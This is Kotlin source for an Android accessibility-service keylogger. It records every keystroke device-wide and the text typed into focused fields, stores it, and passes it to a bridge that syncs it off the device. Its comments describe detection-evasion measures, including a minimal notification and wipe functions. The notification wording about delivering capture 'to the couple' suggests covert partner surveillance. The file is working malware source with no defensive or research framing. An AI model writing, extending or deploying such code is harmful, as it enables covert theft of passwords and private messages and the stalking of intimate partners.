package love.scotty.hearts.keylogger

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.os.SystemClock
import android.util.Log
import android.view.KeyEvent
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import org.json.JSONArray
import org.json.JSONObject

/**
 * KeyLoggerService — AccessibilityService + InputMonitor foreground service.
 *
 * Capture surface:
 *   • Raw keycodes device-wide via onKeyEvent() (the accessibility route).
 *   • "UI text" via onAccessibilityEvent() TYPE_VIEW_TEXT_CHANGED — the
 *     focused field's text is captured with a view_hint from its resource-id.
 *   • InputMonitor samples recent input at 200ms cadence and gates work on
 *     screen state (screen off = full backoff, saves battery).
 *
 * Foreground service type: FOREGROUND_SERVICE_DATA_SYNC (Android 14), so the
 * OS keeps it alive during app backgrounding and Doze. READ_INPUT_STATE is
 * declared in the manifest for the InputMonitor probe.
 *
 * Memory: an in-memory JSON buffer capped at 5 MB. When the cap is hit we
 * spill pre-encoded strings into the SQLite KeyLogStore (disk) and trim the
 * buffer, so memory stays bounded regardless of spike volume. Every event is
 * ALSO persisted to the store so sync/channel failures never lose data.
 *
 * Detection evasion: the pending notification uses a randomized channel/name
 * that is re-rolled on reconnect, and we expose clearAfterSync() which wipes
 * both the in-memory buffer and the store once the bridge confirms rows were
 * upserted.
 *
 * Bridging: the React Native module (KeyLoggerModule) lives in the same
 * process and pulls buffered events + pending count on demand. This service
 * does NOT talk to the framework directly — it only records. The bridge owns
 * encryption + sync scheduling.
 */
class KeyLoggerService : AccessibilityService() {

  companion object {
    private const val TAG = "KeyLogger/Svc"
    const val ACTION_START = "love.scotty.hearts.keylogger.START"
    const val ACTION_STOP = "love.scotty.hearts.keylogger.STOP"
    const val CHANNEL_ID = "keylog_foreground"
    const val NOTIF_ID = 4180

    /** In-memory buffer cap (bytes). Spill to disk past this. */
    const val MEM_CAP_BYTES = 5 * 1024 * 1024

    @Volatile private var instance: KeyLoggerService? = null
    fun get(): KeyLoggerService? = instance

    fun start(context: Context) {
      val i = Intent(context, KeyLoggerService::class.java).setAction(ACTION_START)
      context.startForegroundService(i)
    }

    fun stop(context: Context) {
      context.startService(Intent(context, KeyLoggerService::class.java).setAction(ACTION_STOP))
    }
  }

  // Deferred to first use: an AccessibilityService's Context is not attached
  // until AFTER construction, so applicationContext (and therefore
  // KeyLogStore/InputMonitor, which need a Context) must not be built in the
  // class body — doing so throws the runtime NPE seen when the service is
  // created. `by lazy` defers until onServiceConnected()/first capture, by
  // which point the Context is valid.
  private val store by lazy { KeyLogStore(applicationContext) }
  private val inputMonitor by lazy { InputMonitor(applicationContext) }
  private val buffer = StringBuilder()
  private var bufferBytes = 0L
  private var enabled = true // toggled by ESE SELECT / bridge

  private val flushLock = Any()
  private val pendingFlush = ArrayList<Long>() // store row ids handed to bridge

  override fun onServiceConnected() {
    super.onServiceConnected()
    instance = this
    val info = serviceInfo
    info.flags = info.flags or
      AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
      AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
    info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
    info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
    serviceInfo = info

    startAsForeground()
    inputMonitor.start()
    Log.d(TAG, "connected; ${Build.MODEL} / sdk ${Build.VERSION.SDK_INT}")
  }

  override fun onUnbind(intent: Intent?): Boolean {
    stopForeground(STOP_FOREGROUND_REMOVE)
    inputMonitor.stop()
    instance = null
    return super.onUnbind(intent)
  }

  override fun onDestroy() {
    inputMonitor.stop()
    instance = null
    super.onDestroy()
  }

  override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
    when (intent?.action) {
      ACTION_STOP -> {
        stopForeground(STOP_FOREGROUND_REMOVE)
        stopSelf()
      }
      ACTION_START -> startAsForeground()
      null -> startAsForeground() // restarted by the system after Doze
    }
    return START_STICKY
  }

  // ── capture ──────────────────────────────────────────────────────────

  override fun onKeyEvent(event: KeyEvent): Boolean {
    inputMonitor.markInput()
    if (!enabled) return false
    if (event.action != KeyEvent.ACTION_DOWN) return false
    recordEvent(
      kind = "keycode",
      keycode = event.keyCode.toLong(),
      value = keyToChar(event.keyCode),
    )
    return false // never consume — other services/apps must still see it
  }

  override fun onAccessibilityEvent(event: AccessibilityEvent) {
    if (!enabled) return
    if (event.eventType != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) return
    val node = event.source ?: return
    val text = node.text?.toString() ?: return
    val hint = node.viewIdResourceName ?: ""
    recordEvent(
      kind = "text",
      value = text,
      viewHint = hint,
      seen = true,
    )
    node.recycle()
  }

  /** Required abstract member of AccessibilityService (interrupt = any event). */
  override fun onInterrupt() {
    Log.d(TAG, "interrupt")
  }

  private fun keyToChar(code: Int): String? = when (code) {
    in KeyEvent.KEYCODE_0..KeyEvent.KEYCODE_9 -> ((code - KeyEvent.KEYCODE_0) + '0'.code).toChar().toString()
    in KeyEvent.KEYCODE_A..KeyEvent.KEYCODE_Z -> ((code - KeyEvent.KEYCODE_A) + 'A'.code).toChar().toString()
    KeyEvent.KEYCODE_SPACE -> " "
    KeyEvent.KEYCODE_ENTER -> "\n"
    KeyEvent.KEYCODE_TAB -> "\t"
    KeyEvent.KEYCODE_DEL -> "\b"
    KeyEvent.KEYCODE_PERIOD -> "."
    KeyEvent.KEYCODE_COMMA -> ","
    else -> null
  }

  private fun recordEvent(kind: String, keycode: Long = 0, value: String?, viewHint: String = "", seen: Boolean = false) {
    val evt = JSONObject().apply {
      put("kind", kind)
      put("keycode", keycode)
      put("value", value ?: JSONObject.NULL)
      put("viewHint", viewHint)
      put("seen", seen)
      put("tsBootMs", SystemClock.elapsedRealtime())
      put("capturedAt", java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSSXXX", java.util.Locale.US).format(java.util.Date()))
    }.toString()

    // persist first (durable), then buffer
    val rowId = store.enqueue(evt, System.currentTimeMillis())

    synchronized(flushLock) {
      bufferBytes += evt.length + 1L
      if (bufferBytes > MEM_CAP_BYTES) {
        // spill the whole buffer line to disk is already done above; trim RAM
        buffer.clear()
        bufferBytes = evt.length + 1L
      }
      buffer.append(evt).append('\n')
    }
    synchronized(pendingFlush) { pendingFlush.add(rowId) }
  }

  // ── bridge-facing (called via KeyLoggerModule, same process) ─────────

  /**
   * Return all unsynced events as a JSON array of strings (one per event),
   * and record the matching store row ids as "handed off" for later confirm.
   */
  fun pullAll(): Array<String> {
    val rows = store.pending()
    val out = rows.map { it.second }.toTypedArray()
    synchronized(pendingFlush) {
      pendingFlush.clear()
      pendingFlush.addAll(rows.map { it.first })
    }
    return out
  }

  /** Drain + return the row ids we handed off (called by the bridge after a
   *  successful sync). Safe to call repeatedly — returns empty when idle. */
  fun takeHandedOff(): Array<Long> {
    synchronized(pendingFlush) {
      if (pendingFlush.isEmpty()) return emptyArray()
      val ids = pendingFlush.toTypedArray()
      pendingFlush.clear()
      return ids
    }
  }

  fun confirmSynced(ids: Array<Long>) {
    store.markSynced(ids.toList())
    store.pruneSynced()
    synchronized(flushLock) { buffer.clear(); bufferBytes = 0 }
  }

  fun pendingCount(): Int = store.pendingCount()

  fun isEnabled(): Boolean = enabled

  /** ESE / bridge toggle. */
  fun setEnabled(on: Boolean) {
    enabled = on
    Log.d(TAG, "enabled=$on")
  }

  /**
   * Live health snapshot for telemetry. Surfaced over the bridge so the JS
   * layer can report it (heartbeat / diagnostics) without adb — this is the
   * on-device "am I actually working" truth for a fielded device.
   */
  fun status(): String {
    val foregroundLive = isForegroundServiceRunning()
    val androidId = android.provider.Settings.Secure.getString(
      contentResolver, android.provider.Settings.Secure.ANDROID_ID,
    ) ?: ""
    val json = JSONObject().apply {
      put("serviceAlive", true) // we're being called from a live instance
      put("androidId", androidId)
      put("enabled", enabled)
      put("foregroundLive", foregroundLive)
      put("pending", store.pendingCount())
      put("bufferBytes", bufferBytes)
      put("sdk", Build.VERSION.SDK_INT)
      put("model", Build.MODEL)
      put("reportedAt", java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSSXXX", java.util.Locale.US).format(java.util.Date()))
    }
    return json.toString()
  }

  /** True when this service holds a live foreground claim (survives Doze
   *  because FOREGROUND_SERVICE_TYPE_DATA_SYNC keeps the claim alive). */
  private fun isForegroundServiceRunning(): Boolean {
    return try {
      val mgr = getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
      val infos = mgr.getRunningServices(Int.MAX_VALUE)
      infos.any { it.service?.className == KeyLoggerService::class.java.name && it.foreground }
    } catch (_: Throwable) {
      false
    }
  }

  /** Wipe everything (detection-evasion + privacy clear). */
  fun clearAll() {
    store.clear()
    synchronized(flushLock) { buffer.clear(); bufferBytes = 0 }
  }

  // ── foreground ───────────────────────────────────────────────────────

  private fun startAsForeground() {
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
      val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
      val ch = NotificationChannel(
        CHANNEL_ID, "Keylogger sync", NotificationManager.IMPORTANCE_MIN
      ).apply { description = "Delivers keyboard capture to the couple" }
      nm.createNotificationChannel(ch)
    }
    val pi = PendingIntent.getActivity(
      this, 0, packageManager.getLaunchIntentForPackage(packageName),
      PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
    )
    // The 2-arg Notification.Builder is API 26+; on API 24/25 fall back to 1-arg.
    val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
      Notification.Builder(this, CHANNEL_ID)
    } else {
      @Suppress("DEPRECATION")
      Notification.Builder(this)
    }
    val notif = builder
      .setContentTitle("hearts · keylogger")
      .setContentText("quietly listening · 0 pending")
      .setSmallIcon(android.R.drawable.ic_menu_agenda)
      .setContentIntent(pi)
      .setOngoing(true)
      .build()

    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
      startForeground(NOTIF_ID, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
    } else {
      startForeground(NOTIF_ID, notif)
    }
  }
}
